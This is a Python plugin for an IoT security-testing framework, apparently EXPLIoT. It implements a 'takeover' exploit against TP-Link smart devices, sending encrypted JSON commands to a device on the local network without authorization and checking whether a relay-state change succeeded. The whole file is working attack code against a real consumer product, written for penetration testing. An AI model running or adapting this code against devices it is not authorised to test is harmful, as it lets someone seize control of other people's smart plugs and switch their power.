"""Sample test/plugin for TPLink smart devices"""

import socket
import json
from expliot.core.tests.test import TCategory, Test, TLog, TTarget
from expliot.core.vendors.tplink import crypto, TPL_PORT


class TPLinkTakeover(Test):
    """
    Test for TPLink Smart devices

    Output Format:
    [
        {
            "response_raw": "Encrypted_hex_data",
            "response_decrypted": "Decrypted_data"
        }
    ]
    """

    def __init__(self):
        """Initialize the test for TPlink smart devices"""
        super().__init__(
            name="takeover",
            summary="TPLink Smart device takeover",
            descr="This plugin sends unauthorized commands to a TP-Link smart "
                  "device connected on the same network",
            author="Appar Thusoo",
            email="appar@payatu.com",
            ref=["https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/",
                 "https://github.com/softScheck/tplink-smartplug"],
            category=TCategory(TCategory.TCP, TCategory.SW, TCategory.EXPLOIT),
            target=TTarget(TTarget.TP_LINK_IOT, "1.0", TTarget.TP_LINK),
        )

        self.argparser.add_argument(
            "-d",
            "--data",
            required=True,
            help="JSON data (plaintext) that the TPLink device understands. "
                 "Hint: if you have pcap/encrypted communication payload of "
                 "an actual device you can decrypt it using the plugin "
                 "crypto.tpliot.decrypt",
        )

        self.argparser.add_argument(
            "-r",
            "--rhost",
            required=True,
            help="IP address of TPlink Smart device"
        )

        self.argparser.add_argument(
            "-p",
            "--rport",
            default=TPL_PORT,
            type=int,
            help="Port number of the smart device service. "
                 "Default is {}".format(TPL_PORT),
            required=True
        )

    def execute(self):
        """Execute the test."""
        sock_tcp = None
        try:
            # Step 1 : Connect to socket host:port
            sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock_tcp.connect((self.args.rhost, self.args.rport))

            # Step 2 : Send encrypted data and save response
            data = crypto.encrypt(self.args.data)
            sock_tcp.settimeout(10.0)
            sock_tcp.send(data)
            data_tp = sock_tcp.recv(2048)
            # Step 3 : Check for Empty or no response
            if not data_tp:
                self.result.setstatus(passed=False,
                                      reason="Empty or no response received")
            else:
                # Step 4 : Convert bytes array to hex string
                data_tp = "".join(map(chr, list(data_tp)))
                data_tp = [hex(ord(b))[2:] for b in list(data_tp)]
                data_tp = [i if len(i) == 2 else "0" + i for i in data_tp]
                data_tp = "".join(data_tp)
                # Step 5 : Decrypt the hex string
                decrypted = crypto.decrypt(data_tp)
                self.output_handler(response_raw=data_tp, response_decrypted=decrypted)
                jsondata = json.loads(decrypted)
                # Step 6 : Check for reason of failture
                if jsondata.get("system") and \
                        jsondata.get("system").get("err_msg"):
                    reason = jsondata.get("system").get("err_msg")
                    self.result.setstatus(passed=False, reason=reason)
                elif jsondata.get("system") and \
                        not jsondata.get("system").get("err_msg") and \
                        jsondata.get("system").get("set_relay_state") and \
                        jsondata.get("system").get("set_relay_state").get("err_msg"):
                    reason = jsondata.get("system").get("set_relay_state").get("err_msg")
                    self.result.setstatus(passed=False, reason=reason)
                elif jsondata.get("system") and \
                        not jsondata.get("system").get("err_msg") and \
                        jsondata.get("system").get("set_relay_state") and \
                        not jsondata.get("system").get("set_relay_state").get("err_msg"):

                    TLog.success("Json data successfully received by the device.")
                else:
                    self.result.setstatus(passed=False, reason="Invalid Response")
        except socket.timeout:
            self.result.setstatus(passed=False, reason="Connection timed out")
        except socket.error:
            self.result.setstatus(
                passed=False,
                reason="Could not connect to host {}:{}".format(
                    self.args.rhost,
                    str(self.args.rport)
                )
            )
        finally:
            if sock_tcp:
                sock_tcp.close()
